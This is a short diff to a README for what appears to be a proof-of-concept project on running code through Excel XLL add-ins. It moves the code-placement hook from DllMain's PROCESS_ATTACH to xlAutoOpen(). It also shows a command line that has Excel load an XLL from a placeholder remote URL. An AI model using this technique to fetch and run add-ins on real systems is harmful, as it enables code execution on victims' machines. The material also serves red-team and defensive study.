@@ -14,10 +14,11 @@ A small project that aggregates community knowledge for Excel XLL execution, via
 Put your code in either,
 ```
 dllmain.cpp
- ...
 PROCESS_ATTACH
-  //Code Here
- ...
+
+XLL_POC.cpp
+xlAutoOpen()
+```
 Excel
 ```
 Excel.exe http://foo.com/xll.xll
